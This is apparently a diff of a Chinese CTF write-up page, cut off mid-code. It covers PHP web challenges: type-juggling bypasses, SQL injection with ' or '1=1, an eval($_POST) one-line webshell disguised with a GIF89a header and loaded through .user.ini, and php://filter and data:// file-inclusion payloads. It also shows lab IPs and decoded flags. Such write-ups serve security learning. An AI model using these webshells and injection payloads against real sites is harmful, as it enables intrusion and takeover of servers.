+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;?</span>php
+</span></span><span style="display:flex;"><span>show_source(<span style="color:#ff9f43">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">include</span>(<span style="color:#5af78e">&#34;config.php&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$a</span><span style="color:#ff6ac1">=@</span><span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#39;a&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$b</span><span style="color:#ff6ac1">=@</span><span style="color:#ff5c57">$_GET</span>[<span style="color:#5af78e">&#39;b&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(<span style="color:#ff5c57">$a</span><span style="color:#ff6ac1">==</span><span style="color:#ff9f43">0</span> <span style="color:#ff6ac1">and</span> <span style="color:#ff5c57">$a</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">echo</span> <span style="color:#ff5c57">$flag1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(is_numeric(<span style="color:#ff5c57">$b</span>)){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">exit</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(<span style="color:#ff5c57">$b</span><span style="color:#ff6ac1">&gt;</span><span style="color:#ff9f43">1234</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">echo</span> <span style="color:#ff5c57">$flag2</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#78787e">?&gt;</span><span style="color:#ff5c57">
 </span></span></span></code></pre></div><p>先展示当前文件的源代码，再引入配置文件<code>config.php</code>
-get方式获取a和b，<code>@</code>用来抑制变量未定义时的报错，如果a=0且为真，打印flag1，如果b是数字则退出，如果b大于1234，打印flag2</p><p>绕过第一个：传入以非数字开头的字符串，当字符串与整数比较（<code>$a==0</code>）时，PHP会尝试将字符串转换为数字，如果字符串开头没有数字，那么字符串会被转换为<code>0</code>，因此构造payload1：<code>?a=hi</code></p><p>绕过第二个，<code>$b</code>不能是数字或数字字符串，且数值必须大于1234，PHP在进行数值比较时，会触发自动类型转换，如果字符串以数字开头，它会截取开头的数字部分进行比较，payload2：<code>?b=1235a</code></p><p>payload：<code>?a=hi&amp;b=1235a</code></p><h2 id=111-baby_web重定向>1.11 baby_web(重定向)<a class=anchor href=#111-baby_web%e9%87%8d%e5%ae%9a%e5%90%91>#</a></h2><p>题目描述：想想初始页面是哪个
+get方式获取a和b，<code>@</code>用来抑制变量未定义时的报错，如果a=0且为真，打印flag1，如果b是数字则退出，如果b大于1234，打印flag2</p>
+<p>绕过第一个：传入以非数字开头的字符串，当字符串与整数比较（<code>$a==0</code>）时，PHP会尝试将字符串转换为数字，如果字符串开头没有数字，那么字符串会被转换为<code>0</code>，因此构造payload1：<code>?a=hi</code></p>
+<p>绕过第二个，<code>$b</code>不能是数字或数字字符串，且数值必须大于1234，PHP在进行数值比较时，会触发自动类型转换，如果字符串以数字开头，它会截取开头的数字部分进行比较，payload2：<code>?b=1235a</code></p>
+<p>payload：<code>?a=hi&amp;b=1235a</code></p>
+<h2 id="111-baby_web重定向">1.11 baby_web(重定向)<a class="anchor" href="#111-baby_web%e9%87%8d%e5%ae%9a%e5%90%91">#</a></h2>
+<p>题目描述：想想初始页面是哪个
 bp抓取，修改为index.php，重放发送，结果卡住，排除bp软件问题，这个思路排除
-F12，查看网络，访问index.php，发现其状态为302，重定向，点击发现里面有flag</p><h2 id=112-ingetsql注入>1.12 inget(sql注入)<a class=anchor href=#112-ingetsql%e6%b3%a8%e5%85%a5>#</a></h2><p>进入后直接提示：<code>Please enter ID,and Try to bypass</code>；要求的是通过<code>ID</code>参数进行绕过
-SQL注入测试：<code>?id=1'</code>，页面报错</p><p>因此，注入<code>/?id=1' or '1=1</code></p><p>知识点：
+F12，查看网络，访问index.php，发现其状态为302，重定向，点击发现里面有flag</p>
+<h2 id="112-ingetsql注入">1.12 inget(sql注入)<a class="anchor" href="#112-ingetsql%e6%b3%a8%e5%85%a5">#</a></h2>
+<p>进入后直接提示：<code>Please enter ID,and Try to bypass</code>；要求的是通过<code>ID</code>参数进行绕过
+SQL注入测试：<code>?id=1'</code>，页面报错</p>
+<p>因此，注入<code>/?id=1' or '1=1</code></p>
+<p>知识点：
 假设后端服务器原本的SQL查询语句是<code>SELECT * FROM users WHERE id = '$id';</code>
 那么注入后，拼接结果是<code>WHERE id = '1' or '1'='1'</code>，<code>or '1'='1'</code>永远成立。
-思路是：闭合原有引号、插入<code>OR</code>逻辑、添加一个永真式<code>1=1</code></p><h2 id=113-easyupload文件上传>1.13 easyupload(文件上传)<a class=anchor href=#113-easyupload%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0>#</a></h2><h3 id=1131-一般思路>1.13.1 一般思路<a class=anchor href=#1131-%e4%b8%80%e8%88%ac%e6%80%9d%e8%b7%af>#</a></h3><p>结合题目名字，这里是木马上传的题目，构造<code>a.jpg</code>，内容：
-<code>&lt;?php @eval($_POST['a']); ?></code></p><ul><li><code>&lt;?php ...></code>是PHP代码的界定符，告诉服务器中间的部需要PHP脚本执行</li><li><code>@</code>为错误抑制符，不输出错误信息</li><li><code>eval()</code>将字符串当作PHP代码执行</li><li><code>$_POST['a']</code>是超全局变量，接收通过HTTP POST请求发送过来的数据</li><li>攻击者在本地发送一个POST请求，参数名为<code>a</code>，内容为他想执行的代码，服务器收到请求后，<code>eval()</code>会把传入的字符串立即变成实时代码运行</li></ul><p>提示Your file looks wicked，修改一句话木马，利用短标签绕过
-<code>&lt;?=eval($_POST['a']); ?></code></p><ul><li><code>&lt;?=</code>是PHP的短打印标签，能直接输出后面表达式的结果</li><li><code>eval()</code>函数的返回值通常是<code>null</code>，所以<code>&lt;?=</code>在这里主要不是为了输出，而是为了利用短标签的特性来缩减代码长度，从而躲避某些基于文件长度或关键词的拦截</li></ul><p>提示your filetype looks wicked，尝试在构造时加上GIF89a(图片文件头)</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>GIF89a
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>&lt;?=eval($_POST[&#39;a&#39;]);?&gt;</span></span></code></pre></div><p>接着需要用蚁剑连接，但蚁剑需要php文件才可以连接，因此用bp截取信息修改为php，结果提示Your file looks wicked</p><h3 id=1132-userini思路>1.13.2 <code>.user.ini</code>思路<a class=anchor href=#1132-userini%e6%80%9d%e8%b7%af>#</a></h3><p>经过查阅，可以用<code>.user.ini</code>文件来解决
+思路是：闭合原有引号、插入<code>OR</code>逻辑、添加一个永真式<code>1=1</code></p>
+<h2 id="113-easyupload文件上传">1.13 easyupload(文件上传)<a class="anchor" href="#113-easyupload%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0">#</a></h2>
+<h3 id="1131-一般思路">1.13.1 一般思路<a class="anchor" href="#1131-%e4%b8%80%e8%88%ac%e6%80%9d%e8%b7%af">#</a></h3>
+<p>结合题目名字，这里是木马上传的题目，构造<code>a.jpg</code>，内容：
+<code>&lt;?php @eval($_POST['a']); ?&gt;</code></p>
+<ul>
+<li><code>&lt;?php ...&gt;</code>是PHP代码的界定符，告诉服务器中间的部需要PHP脚本执行</li>
+<li><code>@</code>为错误抑制符，不输出错误信息</li>
+<li><code>eval()</code>将字符串当作PHP代码执行</li>
+<li><code>$_POST['a']</code>是超全局变量，接收通过HTTP POST请求发送过来的数据</li>
+<li>攻击者在本地发送一个POST请求，参数名为<code>a</code>，内容为他想执行的代码，服务器收到请求后，<code>eval()</code>会把传入的字符串立即变成实时代码运行</li>
+</ul>
+<p>提示Your file looks wicked，修改一句话木马，利用短标签绕过
+<code>&lt;?=eval($_POST['a']); ?&gt;</code></p>
+<ul>
+<li><code>&lt;?=</code>是PHP的短打印标签，能直接输出后面表达式的结果</li>
+<li><code>eval()</code>函数的返回值通常是<code>null</code>，所以<code>&lt;?=</code>在这里主要不是为了输出，而是为了利用短标签的特性来缩减代码长度，从而躲避某些基于文件长度或关键词的拦截</li>
+</ul>
+<p>提示your filetype looks wicked，尝试在构造时加上GIF89a(图片文件头)</p>
+<pre tabindex="0"><code>GIF89a
+&lt;?=eval($_POST[&#39;a&#39;]);?&gt;</code></pre><p>接着需要用蚁剑连接，但蚁剑需要php文件才可以连接，因此用bp截取信息修改为php，结果提示Your file looks wicked</p>
+<h3 id="1132-userini思路">1.13.2 <code>.user.ini</code>思路<a class="anchor" href="#1132-userini%e6%80%9d%e8%b7%af">#</a></h3>
+<p>经过查阅，可以用<code>.user.ini</code>文件来解决
 知识点：<code>auto_prepend_file</code>可以让所有的php文件自动的包含某个文件
-例如：在<code>.user.ini</code>文件中写入</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>GIF89a
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>auto_prepend_file=a.jpg</span></span></code></pre></div><p>然后再<code>a.jpg</code>中写入一句话代码，<code>&lt;?php evla($_POST['a']); ?></code>，那么和<code>.user.ini</code>和<code>a.jpg</code>同一目录下的所有php文件都会包含<code>a.jpg</code></p><p>上传<code>.user.ini</code>文件，并修改<code>Content-Type</code>为图片格式<code>image/jpg</code></p><p>尝试蚁剑连接图片路径，URL地址<code>http://61.147.171.105:57298/uploads/a.jpg</code>，连接密码<code>a</code>，但失败
-F12查看流量，发现URL为<code>http://61.147.171.105:57298/uploads/index.php</code>，成功，找到flag</p><h2 id=114-file-include文件包含伪协议>1.14 file include(文件包含伪协议)<a class=anchor href=#114-file-include%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e4%bc%aa%e5%8d%8f%e8%ae%ae>#</a></h2><p>文件包含漏洞：程序在引用外部文件时，未对文件名进行严格过滤，导致攻击者可以控制包含路径，读取敏感文件、执行恶意代码</p><h3 id=1141-源码分析>1.14.1 源码分析<a class=anchor href=#1141-%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90>#</a></h3><p>F12源码中发现被注释掉的PHP代码</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span><span style=color:#ff7b72;font-weight:700>&lt;!--?</span>php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span><span style=color:#ff7b72>if</span>( <span style=color:#ff7b72;font-weight:700>!</span>ini_get(<span style=color:#a5d6ff>&#39;display_errors&#39;</span>) ) {
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>  ini_set(<span style=color:#a5d6ff>&#39;display_errors&#39;</span>, <span style=color:#a5d6ff>&#39;On&#39;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>  }<span style=color:#8b949e;font-style:italic>//如果当前服务器配置不显示错误，则强制将display_errors开启，这样能将脚本运行的问题显示在浏览器中
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>error_reporting(<span style=color:#ff7b72>E_ALL</span>);	<span style=color:#8b949e;font-style:italic>//设置PHP报告所有类型的错误
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span><span style=color:#8b949e;font-style:italic>//以上意思：我要看到所有运行错误
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span><span style=color:#79c0ff>$lan</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>$_COOKIE</span>[<span style=color:#a5d6ff>&#39;language&#39;</span>];
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span><span style=color:#ff7b72>if</span>(<span style=color:#ff7b72;font-weight:700>!</span><span style=color:#79c0ff>$lan</span>)
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>	<span style=color:#ff7b72;font-weight:700>@</span>setcookie(<span style=color:#a5d6ff>&#34;language&#34;</span>,<span style=color:#a5d6ff>&#34;english&#34;</span>);<span style=color:#8b949e;font-style:italic>//向用户的浏览器写入一个cookie，language是cookie名称，english是cookie值
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>	<span style=color:#ff7b72;font-weight:700>@</span><span style=color:#ff7b72>include</span>(<span style=color:#a5d6ff>&#34;english.php&#34;</span>);<span style=color:#8b949e;font-style:italic>//将另一个文件的内容包含（导入）到当前文件中并执行
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span>}<span style=color:#8b949e;font-style:italic>//如果用户没有设置名为lanuage的cookie（第一次访问），程序就默认给用户导入值为english的cookie，并包含english.php来显示英文
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span><span style=color:#ff7b72>else</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">16</span><span>	<span style=color:#ff7b72;font-weight:700>@</span><span style=color:#ff7b72>include</span>(<span style=color:#79c0ff>$lan</span><span style=color:#ff7b72;font-weight:700>.</span><span style=color:#a5d6ff>&#34;.php&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">17</span><span>}<span style=color:#8b949e;font-style:italic>//如果用于已经有了cookie，程序会自动拼接上.php，因此可以修改cookie的值，控制include包含任意文件
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">18</span><span><span style=color:#79c0ff>$x</span><span style=color:#ff7b72;font-weight:700>=</span>file_get_contents(<span style=color:#a5d6ff>&#39;index.php&#39;</span>);<span style=color:#8b949e;font-style:italic>//将index.php里的代码抓取出来，存放在变量$x中
-</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">19</span><span><span style=color:#ff7b72>echo</span> <span style=color:#79c0ff>$x</span>;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">20</span><span><span style=color:#ff7b72;font-weight:700>?--&gt;</span></span></span></code></pre></div><h3 id=1142-php的filter伪协议>1.14.2 PHP的<code>filter</code>伪协议<a class=anchor href=#1142-php%e7%9a%84filter%e4%bc%aa%e5%8d%8f%e8%ae%ae>#</a></h3><p>使用php的<code>filter</code>伪协议，将目标文件内容进行Base64编码后再输出
+例如：在<code>.user.ini</code>文件中写入</p>
+<pre tabindex="0"><code>GIF89a
+auto_prepend_file=a.jpg</code></pre><p>然后再<code>a.jpg</code>中写入一句话代码，<code>&lt;?php evla($_POST['a']); ?&gt;</code>，那么和<code>.user.ini</code>和<code>a.jpg</code>同一目录下的所有php文件都会包含<code>a.jpg</code></p>
+<p>上传<code>.user.ini</code>文件，并修改<code>Content-Type</code>为图片格式<code>image/jpg</code></p>
+<p>尝试蚁剑连接图片路径，URL地址<code>http://61.147.171.105:57298/uploads/a.jpg</code>，连接密码<code>a</code>，但失败
+F12查看流量，发现URL为<code>http://61.147.171.105:57298/uploads/index.php</code>，成功，找到flag</p>
+<h2 id="114-file-include文件包含伪协议">1.14 file include(文件包含伪协议)<a class="anchor" href="#114-file-include%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e4%bc%aa%e5%8d%8f%e8%ae%ae">#</a></h2>
+<p>文件包含漏洞：程序在引用外部文件时，未对文件名进行严格过滤，导致攻击者可以控制包含路径，读取敏感文件、执行恶意代码</p>
+<h3 id="1141-源码分析">1.14.1 源码分析<a class="anchor" href="#1141-%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90">#</a></h3>
+<p>F12源码中发现被注释掉的PHP代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff6ac1">&lt;!--?</span>php
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>( <span style="color:#ff6ac1">!</span>ini_get(<span style="color:#5af78e">&#39;display_errors&#39;</span>) ) {
+</span></span><span style="display:flex;"><span>  ini_set(<span style="color:#5af78e">&#39;display_errors&#39;</span>, <span style="color:#5af78e">&#39;On&#39;</span>);
+</span></span><span style="display:flex;"><span>  }<span style="color:#78787e">//如果当前服务器配置不显示错误，则强制将display_errors开启，这样能将脚本运行的问题显示在浏览器中
+</span></span></span><span style="display:flex;"><span>error_reporting(<span style="color:#ff6ac1">E_ALL</span>);	<span style="color:#78787e">//设置PHP报告所有类型的错误
+</span></span></span><span style="display:flex;"><span><span style="color:#78787e">//以上意思：我要看到所有运行错误
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">$lan</span> <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">$_COOKIE</span>[<span style="color:#5af78e">&#39;language&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span>(<span style="color:#ff6ac1">!</span><span style="color:#ff5c57">$lan</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#ff6ac1">@</span>setcookie(<span style="color:#5af78e">&#34;language&#34;</span>,<span style="color:#5af78e">&#34;english&#34;</span>);<span style="color:#78787e">//向用户的浏览器写入一个cookie，language是cookie名称，english是cookie值
+</span></span></span><span style="display:flex;"><span>	<span style="color:#ff6ac1">@</span><span style="color:#ff6ac1">include</span>(<span style="color:#5af78e">&#34;english.php&#34;</span>);<span style="color:#78787e">//将另一个文件的内容包含（导入）到当前文件中并执行
+</span></span></span><span style="display:flex;"><span>}<span style="color:#78787e">//如果用户没有设置名为lanuage的cookie（第一次访问），程序就默认给用户导入值为english的cookie，并包含english.php来显示英文
+</span></span></span><span style="display:flex;"><span><span style="color:#ff6ac1">else</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#ff6ac1">@</span><span style="color:#ff6ac1">include</span>(<span style="color:#ff5c57">$lan</span><span style="color:#ff6ac1">.</span><span style="color:#5af78e">&#34;.php&#34;</span>);
+</span></span><span style="display:flex;"><span>}<span style="color:#78787e">//如果用于已经有了cookie，程序会自动拼接上.php，因此可以修改cookie的值，控制include包含任意文件
+</span></span></span><span style="display:flex;"><span><span style="color:#ff5c57">$x</span><span style="color:#ff6ac1">=</span>file_get_contents(<span style="color:#5af78e">&#39;index.php&#39;</span>);<span style="color:#78787e">//将index.php里的代码抓取出来，存放在变量$x中
+</span></span></span><span style="display:flex;"><span><span style="color:#ff6ac1">echo</span> <span style="color:#ff5c57">$x</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">?--&gt;</span></span></span></code></pre></div><h3 id="1142-php的filter伪协议">1.14.2 PHP的<code>filter</code>伪协议<a class="anchor" href="#1142-php%e7%9a%84filter%e4%bc%aa%e5%8d%8f%e8%ae%ae">#</a></h3>
+<p>使用php的<code>filter</code>伪协议，将目标文件内容进行Base64编码后再输出
 构造payload：让<code>$lan</code>的值位伪协议语句，由于后端会自动加上<code>.php</code>，在payload中不要写后缀
-<code>language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</code></p><ul><li><code>php://filter</code>是元封装器，让开发者在打开文件流时能够应用特定的过滤器</li><li><code>read=</code>告诉php，要对读取的数据流进行操作</li><li><code>convert.base64-encode</code>要求php将读取的文件内容进行Base64编码（防止php引擎解析目标文件的内容，吐过直接包含<code>flag.php</code>，php引擎会识别其中的<code>&lt;?php...?></code>，并运行，结果是看不到flag的，只有编码后，对于php引擎来说，这段base64字符串只是一串普通的文本，于是不会运行，）</li><li><code>resource=/var/www/html/flag</code>指定读取的目标文件路径</li><li>注入到<code>$lan</code>变量后，服务器实际执行的命令等同于<code>include("php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php");</code></li><li><code>$lan</code>是如何打印出来的：<code>include</code>函数的作用是读取文件内容，且直接输出到HTML页面中</li></ul><p>F12，在hackbar中，给cookie注入<code>language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</code></p><p>执行后获得base64编码
-<code>PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2QyNzY4MDQ4MWRjNzUyNGE1NTM5YWJhM2FlNDEzZjgxfSI7DQo/Pg==</code></p><p>base64解码后获得</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>&lt;?php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>$flag=&#34;cyberpeace{d27680481dc7524a5539aba3ae413f81}&#34;;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">3</span><span>?&gt;</span></span></code></pre></div><h2 id=115-fileclude文件包含伪协议>1.15 fileclude(文件包含伪协议)<a class=anchor href=#115-fileclude%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e4%bc%aa%e5%8d%8f%e8%ae%ae>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span>WRONG WAY<span style=color:#ff7b72;font-weight:700>!</span> <span style=color:#ff7b72;font-weight:700>&lt;?</span>php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span><span style=color:#ff7b72>include</span>(<span style=color:#a5d6ff>&#34;flag.php&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>highlight_file(<span style=color:#79c0ff;font-weight:700>__FILE__</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span><span style=color:#ff7b72>if</span>(isset(<span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#34;file1&#34;</span>]) <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> isset(<span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#34;file2&#34;</span>]))
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>{
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>    <span style=color:#79c0ff>$file1</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#34;file1&#34;</span>];
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>    <span style=color:#79c0ff>$file2</span> <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>$_GET</span>[<span style=color:#a5d6ff>&#34;file2&#34;</span>];
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>    <span style=color:#ff7b72>if</span>(<span style=color:#ff7b72;font-weight:700>!</span><span style=color:#ff7b72>empty</span>(<span style=color:#79c0ff>$file1</span>) <span style=color:#ff7b72;font-weight:700>&amp;&amp;</span> <span style=color:#ff7b72;font-weight:700>!</span><span style=color:#ff7b72>empty</span>(<span style=color:#79c0ff>$file2</span>))
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>    {
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>        <span style=color:#ff7b72>if</span>(file_get_contents(<span style=color:#79c0ff>$file2</span>) <span style=color:#ff7b72;font-weight:700>===</span> <span style=color:#a5d6ff>&#34;hello ctf&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>        {
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>            <span style=color:#ff7b72>include</span>(<span style=color:#79c0ff>$file1</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span>        }
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span>    <span style=color:#ff7b72>else</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">16</span><span>        <span style=color:#ff7b72>die</span>(<span style=color:#a5d6ff>&#34;NONONO&#34;</span>);
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">17</span><span>}</span></span></code></pre></div><ul><li><code>include()</code>作用：当前<em>脚本执行处</em>包含并运行一个指定文件的代码</li><li>如果<code>$file2</code>内容为<code>hello ctf</code>，那么</li><li>利用<code>$file1</code>文件包含漏洞执行代码or读取flag</li></ul><p>payload构造：
-<code>http://61.147.171.105:53798/index.php?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=data://text/plain,hello ctf</code></p><ul><li><code>php://filter</code>告诉php，对文件流进行过滤操作</li><li><code>read=convert.base64-encode</code>是过滤器指令</li><li><code>data://</code>data协议头，表示后面跟着的是数据本身</li><li><code>text/plain</code>告诉服务器，这些数据是纯文本格式</li><li><code>,hello ctf</code>逗号后面是具体内容</li></ul><p><code>PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXtiNGI5NWY3OTA4ODAwMjI0ZTI2ZGZmYWFkMWI3NTU5OH0=</code></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-fallback data-lang=fallback><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>&lt;?php
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>echo &#34;WRONG WAY!&#34;;
